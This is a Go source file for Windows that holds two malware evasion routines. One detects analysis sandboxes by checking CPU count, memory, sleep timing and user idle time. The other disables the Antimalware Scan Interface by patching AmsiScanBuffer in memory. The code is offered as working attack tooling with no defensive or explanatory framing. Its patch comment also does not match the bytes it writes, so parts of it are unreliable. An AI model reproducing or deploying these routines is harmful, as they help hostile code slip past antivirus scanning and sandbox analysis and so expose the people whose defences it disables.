package main

import (
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Struct definitions
type MemoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

type LastInputInfo struct {
	Size uint32
	Time uint32
}

// Sandbox detection checks
func isSandbox() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")
	
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	getTickCount := kernel32.NewProc("GetTickCount")
	getLastInputInfo := user32.NewProc("GetLastInputInfo")

	// Check 1: CPU cores (VMs typically have < 2)
	if runtime.NumCPU() < 2 {
		return true
	}

	// Check 2: RAM size
	var memStatus MemoryStatusEx
	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
	if ret != 0 {
		totalRAM := memStatus.TotalPhys / (1024 * 1024 * 1024) // Convert to GB
		if totalRAM < 4 {
			return true // Less than 4GB is suspicious
		}
	}

	// Check 3: Sleep acceleration (sandboxes speed up time)
	start := time.Now()
	time.Sleep(1 * time.Second)
	elapsed := time.Since(start)

	if elapsed < 900*time.Millisecond {
		return true // Sleep was accelerated
	}

	// Check 4: User activity simulation
	var lastInput LastInputInfo
	lastInput.Size = uint32(unsafe.Sizeof(lastInput))
	
	ret, _, _ = getLastInputInfo.Call(uintptr(unsafe.Pointer(&lastInput)))
	if ret != 0 {
		r1, _, _ := getTickCount.Call()
		tickCount := uint32(r1)
		idleTime := (tickCount - lastInput.Time) / 1000 // Convert to seconds
		
		// If idle for > 10 minutes, might be sandbox
		if idleTime > 600 {
			return true
		}
	}

	return false
}

// AMSI bypass using memory patching
func bypassAMSI() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	amsi := syscall.NewLazyDLL("amsi.dll")
	
	// Get handle to amsi.dll
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
	if amsiScanBuffer.Find() != nil {
		return false // AMSI not loaded
	}

	// Patch AmsiScanBuffer to always return clean
	// Pattern: ret 0 (C3 00)
	patch := []byte{0xC3} // RET instruction
	
	addr := amsiScanBuffer.Addr()
	
	virtualProtect := kernel32.NewProc("VirtualProtect")
	var oldProtect uint32
	
	// Change memory protection to RWX
	ret, _, _ := virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	
	if ret == 0 {
		return false
	}

	// Write patch
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// Restore original protection
	virtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return true
}
